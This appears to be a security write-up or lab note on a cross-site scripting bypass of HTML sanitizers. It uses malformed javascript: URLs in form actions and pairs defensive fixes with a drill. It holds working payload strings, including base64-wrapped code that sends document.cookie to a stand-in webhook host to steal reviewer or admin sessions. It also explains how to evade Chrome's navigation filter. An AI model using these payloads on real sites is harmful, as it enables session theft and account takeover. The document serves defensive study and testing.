# Invalid JavaScript URL Sanitizer Form Action Bypass

## Date

2026-07-09

## Target Type

Client-side HTML sanitizers, snippet preview flows, and review bots that auto-submit forms

## Bug Class

XSS through URL parser differential, malformed `javascript:` URI bypass, form-action execution, browser navigation filter evasion

## Initial Signal

Look for flows where:

- a sanitizer strips `action`, `formaction`, `href`, or `src` when `new URL(value).protocol === 'javascript:'`
- parse failures are treated as "not javascript:"
- forms are allowed in sanitized HTML
- a preview or reviewer bot auto-submits the first form
- the goal is reviewer/admin cookie theft

Common vulnerable check:

```javascript
try {
  return new URL(value).protocol === 'javascript:';
} catch (_) {
  return false;
}
```

## Pattern

### Stage 1: sanitizer slip

Use a malformed absolute `javascript:` URL that throws in `new URL()`:

```text
javascript://://-PAYLOAD//
```

The sanitizer keeps it because parsing failed.

### Stage 2: browser re-serialization

On GET form submit, Chrome appends `?` and rewrites path-only `javascript:` URLs that begin with `//`:

```text
javascript://://-alert(1)//  ->  javascript:/.//-alert(1)//?
```

That becomes valid JavaScript: regex `/./`, division `/`, unary `-`, payload, trailing comment.

### Stage 3: cookie-read evasion

Chrome blocks `javascript:` navigation URLs containing literal substrings such as:

- `document`
- `cookie`

So direct payloads like:

```text
javascript://://-fetch('https://[webhook]?c='+document.cookie)//
```

may sanitize-slip and re-parse but still fail at navigation time.

Working pattern:

```text
javascript://://-eval(atob('BASE64_PAYLOAD'))//
```

Where base64 decodes to something like:

```javascript
new Image().src='//webhook.site/[UUID]?c='+document.cookie
```

## Trust Boundaries

| Component | What it sees | Decision |
|---|---|---|
| Sanitizer `new URL()` | `javascript://://-...` | throws -> keep attribute |
| Browser form submit | reparsed `javascript:/.//-...//?` | executes JS |
| Chrome navigation filter | literal `document` / `cookie` in URL | block unless obfuscated |

## Common Mistakes

- Putting the payload only on `formaction` when the bot calls `requestSubmit()` without a submitter.
- Assuming sanitizer slip equals exfil; test the full activation path.
- Using `document.cookie` directly in the `action` attribute after learning the reparsing trick.
- Testing only `alert(1)` and stopping before cookie theft works end to end.
- Copying DOM-clobbering payloads from older sanitizer builds that already patch prototype accessors.

## Defensive Fix

- Reject any URL-valued attribute whose normalized lowercase value starts with `javascript`, regardless of parser success.
- Use `URL.canParse()` / `URL.parse()` and fail closed.
- Do not auto-submit sanitized third-party HTML in privileged review contexts.
- Treat form `action` as a script sink when combined with auto-submit behavior.

## Related Labs

- Pillbox: malformed `javascript:` on allowed `<form action>`
- COLLIDE: DOM clobbering on denied `<form>` instead of URL parser bypass
- Bad Schema: control-character prefix before `javascript:` in redirectors

## Drill

Given:

```javascript
function safeUrl(v) {
  try { return new URL(v).protocol !== 'javascript:'; }
  catch { return true; }
}
```

Ask:

1. Does `safeUrl('javascript://://-alert(1)//')` return true or false?
2. What does the browser do when a GET form with that `action` is submitted?
3. Why is `eval(atob(...))` sometimes required after the bypass works?

## Checklist Update

When reviewing sanitizer URL handling, test malformed `javascript:` values on every URL attribute the build allows, especially `action` and `formaction`, and confirm whether any downstream code auto-activates forms or links.
